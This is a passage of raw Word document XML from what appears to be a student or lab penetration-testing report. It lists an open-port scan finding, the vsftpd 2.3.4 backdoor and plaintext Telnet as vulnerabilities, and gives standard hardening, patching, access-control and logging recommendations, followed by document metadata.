      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="78EDD649" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Findings: Displayed various open ports and services, which were reviewed for potential further exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5742B504" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Potential Vulnerabilities and Security Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35273617" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Vulnerabilities Identified:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- FTP Service: The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2.3.4 vulnerability provides unauthorized access via a backdoor.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Telnet: Telnet is insecure as it transmits data in plain text.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428958D2" w14:textId="4587DD64" w:rsidR="00273A7E" w:rsidRDefault="00F317C5">
      <w:r>
        <w:t>Security Recommendations:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Service Hardening: Disable unnecessary services like Telnet and FTP on production systems.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Regular Updates: Keep services up-to-date to avoid known vulnerabilities.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Access Control: Limit access to sensitive services and ports.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Monitoring and Logging: Implement logging and alerting for unauthorized access attempts.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00273A7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95733270">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1189223285">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1171212663">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1437335628">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2001350734">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1872180253">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="2111774835">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1097484281">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1504666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05266"/>
    <w:rsid w:val="00273A7E"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="004F0CC3"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C574D1"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F317C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E7C566"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{FD0EC736-C1A7-460D-803C-1B6B50860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7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84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0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9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1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7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3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7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3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9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65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3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1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0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971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6494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Akash Rafi</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-01T15:41:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-11-01T15:41:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>